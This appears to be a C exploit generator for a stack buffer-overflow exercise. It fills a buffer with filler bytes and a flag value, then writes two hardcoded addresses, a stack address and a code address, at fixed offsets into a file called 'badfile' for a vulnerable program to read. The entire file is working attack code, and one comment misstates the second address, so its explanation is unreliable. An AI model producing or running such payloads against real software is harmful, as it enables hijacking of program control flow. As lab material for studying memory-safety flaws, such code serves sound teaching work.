#include <stdio.h>

int main() {
  FILE *fd;
  char buf[752] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-XXXXXXXXXXXX\x01\x00\x00\x00";
//buf[76] to buf[79] contains value 1

 //The values to be used are 0x7FFFFFFFE3d0 values from buf[112] to buf[119] i.e. shown below
  buf[112] = 0xd0;
  buf[113] = 0xE3;
  buf[114] = 0xFF;
  buf[115] = 0xFF;
  buf[116] = 0xFF;
  buf[117] = 0x7F;
  buf[118] = 0x00;
  buf[119] = 0x00;
//and 0x7FFFFFFFE3d0 values from buf[120] to buf[127]
  buf[120] = 0x40;
  buf[121] = 0xe3;
  buf[122] = 0x55;
  buf[123] = 0x55;
  buf[124] = 0x55;
  buf[125] = 0x55;
  buf[126] = 0x00;
  buf[127] = 0x00;
//The addresses are split into the chuncks
  fd = fopen("badfile", "w");
  fwrite(buf, sizeof(char), 128, fd);
  fclose(fd);
}